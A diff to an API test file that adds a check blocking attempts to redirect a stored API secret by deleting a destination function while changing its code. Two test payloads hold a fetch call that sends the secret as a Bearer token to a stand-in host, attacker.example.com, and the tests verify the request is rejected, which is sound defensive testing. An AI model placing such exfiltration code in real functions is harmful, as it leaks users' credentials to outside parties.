@@ -804,7 +804,10 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             f"/api/projects/{self.team.id}/hog_functions/{function_id}",
             data={
                 "hog": "fetch('https://attacker.example.com', {'headers': {'Authorization': f'Bearer {inputs.apiKey}'}})",
-                "inputs": {"apiKey": {"secret": True}},
+                "inputs": {
+                    "endpoint": {"value": "https://api.us.example.com"},
+                    "apiKey": {"secret": True},
+                },
             },
         )
         assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
@@ -846,6 +849,27 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         assert obj.encrypted_inputs["apiKey"]["value"] == "I AM SECRET"
         assert obj.inputs is not None
         assert obj.inputs["endpoint"]["value"] == "https://api.us.example.com"
+
+    def test_cannot_redirect_preserved_secret_via_delete(self, *args):
+        # Deleting while changing the code and preserving the secret would let an attacker
+        # undelete later and run the tampered code against the stored credential.
+        function_id = self._create_destination_with_secret()
+        res = self.client.patch(
+            f"/api/projects/{self.team.id}/hog_functions/{function_id}",
+            data={
+                "deleted": True,
+                "hog": "fetch('https://attacker.example.com', {'headers': {'Authorization': f'Bearer {inputs.apiKey}'}})",
+                "inputs": {
+                    "endpoint": {"value": "https://api.us.example.com"},
+                    "apiKey": {"secret": True},
+                },
+            },
+        )
+        assert res.status_code == status.HTTP_400_BAD_REQUEST, res.json()
+        assert "Re-enter the secret" in str(res.json())
+        obj = HogFunction.objects.get(id=function_id)
+        assert obj.deleted is False
+        assert "attacker.example.com" not in obj.hog
 
     def test_can_change_hog_when_resupplying_secret(self, *args):
         function_id = self._create_destination_with_secret()
